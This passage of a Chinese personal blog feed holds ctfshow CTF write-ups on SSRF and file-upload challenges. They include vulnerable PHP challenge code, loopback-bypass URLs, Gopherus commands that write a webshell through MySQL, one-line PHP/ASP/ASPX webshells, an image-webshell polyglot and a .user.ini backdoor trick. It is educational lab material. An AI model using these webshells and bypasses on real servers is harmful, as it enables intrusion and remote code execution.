src="//music.163.com/outchain/player?type=2&id=1842801466&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowSSRF</title>
      <link href="posts/facc626e/"/>
      <url>posts/facc626e/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><em>SSRF</em></strong><br>其全称：Server—Side Request Forgery :服务器端请求伪造<br>是一种由攻击者构造形成的由 服务器端发起请求的一个安全漏洞。一般情况下，攻击的目是外网没有办法访问的内网。<br>很多WEb应用都其提供了从其他服务器上获取数据的功能，使用指定的url,web 应用可以获取图片，下载文件，读取文件等。这个功能如果被恶意使用，可以利用存在缺陷的web引用做为代理，攻击远程和本地服务器。</p><h1 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>curl_setopt — 设置一个cURL传输选项<br>curl_init — 初始化一个cURL会话<br>curl_close — 关闭一个cURL会话</p></blockquote><p>这里扫描发现一个flag.php这个页面但是非本地用户是不允许访问的！<br>肯定是要让我们以本地用户去访问127.0.0.1/flag.php!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure><hr /><h1 id="web352-353-ip-绕过"><a href="#web352-353-ip-绕过" class="headerlink" title="web352~353(ip 绕过)"></a>web352~353(ip 绕过)</h1><blockquote><p>十六进制<br>  url=<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a><br><br>八进制<br>  url=<a href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a><br><br>10 进制整数格式<br>  url=<a href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a><br><br>16 进制整数格式.<br>  url=<a href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a><br><br>还有一种特殊的省略模式<br><br>  127.0.0.1写成127.1<br>用CIDR绕过localhost<br><br>  url=<a href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a><br>还有很多方式<br><br>  url=<a href="http://0.0.0.0/flag.php">http://0/flag.php</a><br>  url=<a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p></blockquote><p><strong><em><a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">https://tool.520101.com/wangluo/jinzhizhuanhuan/</a></em></strong><br><a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">转换网站！</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure><hr /><h1 id="web354-DNS重绑定"><a href="#web354-DNS重绑定" class="headerlink" title="web354(DNS重绑定)"></a>web354(DNS重绑定)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure><p>这里看着大师傅做的！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;sudo.cc&#x2F;flag.php</span><br></pre></td></tr></table></figure><blockquote><p>parse_url — 解析 URL，返回其组成部分<br>CURLOPT_HEADER 启用时会将头文件的信息作为数据流输出。<br>CURLOPT_RETURNTRANSFER TRUE 将curl_exec()获取的信息以字符串返回，而不是直接输出。 </p></blockquote><hr /><h1 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((strlen(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure><p>这里是要求url里面的host主体部分小于5的！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;127.1&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>这样构造就可以了！</p><h1 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((strlen(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure><p>这里变本加厉的将长度缩短为3一下了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0&#x2F;flag.php</span><br></pre></td></tr></table></figure><blockquote><p>0在 linux 系统中会解析成127.0.0.1在windows中解析成0.0.0.0</p></blockquote><hr /><h1 id="web357-DNS重绑定-未做"><a href="#web357-DNS重绑定-未做" class="headerlink" title="web357(DNS重绑定)(未做)"></a>web357(DNS重绑定)(未做)</h1><p>DNS是Domain Name Service的缩写,计算机域名服务器,在Internet上域名与IP地址之间是一一对应的，域名虽然便于人们记忆，但机器之间只能互相认识IP地址，它们之间的转换工作称为域名解析，而域名解析需要由专门的域名解析服务器来完成，这就是DNS域名服务器。</p><p>这里其实还是有点不理解的！所以不再所说什么了！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = gethostbyname(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!filter_var(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> scheme</span><br></pre></td></tr></table></figure><blockquote><p>gethostbyname — 返回主机名对应的 IPv4地址。<br>filter_var — 使用特定的过滤器过滤一个变量<br>file_get_contents — 将整个文件读入一个字符串</p></blockquote><hr /><h1 id="web358-URL-BYPASS"><a href="#web358-URL-BYPASS" class="headerlink" title="web358(URL BYPASS)"></a>web358(URL BYPASS)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>正则表达式意思为以ctf开头，以show结尾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ctf.@127.0.0.1&#x2F;flag.php?show</span><br></pre></td></tr></table></figure><hr /><h1 id="359-gopherus-无密码mysql-未做"><a href="#359-gopherus-无密码mysql-未做" class="headerlink" title="359(gopherus-无密码mysql)(未做)"></a>359(gopherus-无密码mysql)(未做)</h1><p>这里是个登录框！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py --exploit mysql</span><br><span class="line">root</span><br><span class="line">select &quot;&lt;?php eval@($_POST[1]);?&gt;&quot; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021041921492740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里用到了Gopherus工具！这是用python2写的，所以我们要有python2的环境！<br><img src="https://img-blog.csdnimg.cn/20210419220109986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web360-redis-未做"><a href="#web360-redis-未做" class="headerlink" title="web360(redis)(未做)"></a>web360(redis)(未做)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>python gopherus.py –exploit redis<br><img src="https://img-blog.csdnimg.cn/20210419221013914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1839480696&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow文件上传</title>
      <link href="posts/40ef20eb/"/>
      <url>posts/40ef20eb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="web151-前端限制"><a href="#web151-前端限制" class="headerlink" title="web151(前端限制)"></a>web151(前端限制)</h1><p>这里需要上传图片木马！所以我们需要先制作一张图片木马！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马： <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">asp的一句话是：   &lt;%<span class="keyword">eval</span> request (<span class="string">&quot;pass&quot;</span>)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt; &lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;pass&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure><p>这里是比较常用的一句话木马！</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.png/b+<span class="number">2</span>.php/a <span class="number">3</span>.png</span><br></pre></td></tr></table></figure><p>然后上传抓包！<br><img src="https://img-blog.csdnimg.cn/2021041219314443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就有点搞笑了！<br><img src="https://img-blog.csdnimg.cn/20210412193325290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上面是错误示范！<br><img src="https://img-blog.csdnimg.cn/20210412194632428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样子就可以了！</p><hr /><h1 id="web152-后端限制"><a href="#web152-后端限制" class="headerlink" title="web152(后端限制)"></a>web152(后端限制)</h1><p>这里与上一题是一样的方法！<br>一模一样！分毫不差！</p><hr /><h1 id="web153-user-ini配置文件绕过"><a href="#web153-user-ini配置文件绕过" class="headerlink" title="web153(.user.ini配置文件绕过)"></a>web153(.user.ini配置文件绕过)</h1><p>上传php不解析，所以我们就要换个思路了！</p><blockquote><p>php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=filename      <span class="comment">//包含在文件头</span></span><br><span class="line">auto_append_file=filename       <span class="comment">//包含在文件尾</span></span><br></pre></td></tr></table></figure><p>这是两个配置项！<br>所以我们先上传一个.user.ini文件，里面写auto_prepend_file=3.php<br><img src="https://img-blog.csdnimg.cn/2021041221431198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们再上传一个图片木马<br>里面写入<?php @eval($_POST[pass]);?><br><img src="https://img-blog.csdnimg.cn/20210412214127975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web154-限制字符"><a href="#web154-限制字符" class="headerlink" title="web154(限制字符)"></a>web154(限制字符)</h1><p>刚开始接着上传.user.ini！<br><img src="https://img-blog.csdnimg.cn/20210412214607525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们可以对其改为短标签</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&quot;tac ../f*&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>或者改了大写形式的一句话木马！<br><img src="https://img-blog.csdnimg.cn/20210412215702618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web155-短标签绕过"><a href="#web155-短标签绕过" class="headerlink" title="web155(短标签绕过)"></a>web155(短标签绕过)</h1><p>这里其实过滤了php所以我们可以改成短标签来进行绕过！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&quot;tac ../f*&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">或者</span><br><span class="line"><span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span>  等价于 <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span> <span class="comment">//无限制</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(@_POST[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">这里就是用一句话木马了！</span><br></pre></td></tr></table></figure><p>这里将其php大写是通不过的<br>用web154方法可以通过！<br><img src="https://img-blog.csdnimg.cn/20210413153610503.png" alt="在这里插入图片描述"></p><hr /><h1 id="web156-过滤"><a href="#web156-过滤" class="headerlink" 